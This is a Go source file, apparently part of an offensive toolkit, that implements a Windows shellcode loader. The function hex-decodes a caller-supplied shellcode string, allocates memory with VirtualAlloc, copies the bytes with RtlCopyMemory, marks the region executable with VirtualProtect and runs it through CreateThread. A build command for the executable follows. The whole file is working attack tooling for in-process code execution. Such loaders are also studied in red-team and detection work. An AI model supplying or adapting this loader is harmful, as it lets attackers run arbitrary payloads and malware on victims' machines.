// +build windows

/*
This program executes shellcode in the current process using the following steps
	1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	3. Change the memory page permissions to Execute/Read with VirtualProtect
	4. Call CreateThread on shellcode address
	5. Call WaitForSingleObject so the program does not end before the shellcode is executed

This program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them
*/

package go_shellcode

import (
	"encoding/hex"
	"errors"
	"fmt"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

func RunSCcreateThread(sc string, printLevel int) error {
	var verbose, debug bool
	if printLevel > 0 {
		verbose = true
	}
	if printLevel > 1 {
		debug = true
	}
	// Pop Calc Shellcode
	shellcode, errShellcode := hex.DecodeString(sc)
	if errShellcode != nil {
		return errors.New(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	if debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}
	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil {
		return errors.New(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		return errors.New("[!]VirtualAlloc failed and returned 0")
	}

	if verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
	}
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}

	if verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
	}
	var oldProtect uint32
	errVirtualProtect := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if errVirtualProtect != nil {
		return errors.New(fmt.Sprintf("[!]Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if debug {
		fmt.Println("[DEBUG]Calling CreateThread...")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
	}
	if verbose {
		fmt.Println("[+]Shellcode Executed")
	}

	if debug {
		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
	}

	event, errWaitForSingleObject := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	if errWaitForSingleObject != nil {
		return errors.New(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
	}
	if verbose {
		fmt.Println(fmt.Sprintf("[-]WaitForSingleObject returned with %d", event))
	}
	return nil
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateThread.exe cmd/CreateThread/main.go
